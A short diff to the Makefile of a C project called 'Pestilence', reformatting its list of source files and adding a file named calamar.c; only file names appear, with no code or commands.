@@ -15,11 +15,12 @@ NAME = 			Pestilence
 OBJ_DIR  =		./obj/
 
 SRC_DIR =	./src/
-SRC_WWP = 	main.c\
-		write64.c\
-		write32.c\
-		output_handle.c\
-		antidebuggeur.c
+SRC_WWP = 	main.c		\
+		write64.c	\
+		write32.c	\
+		output_handle.c	\
+		antidebuggeur.c	\
+		calamar.c
 
 
 SRCS      =	$(addprefix $(SRC_DIR), $(SRC_WWP))
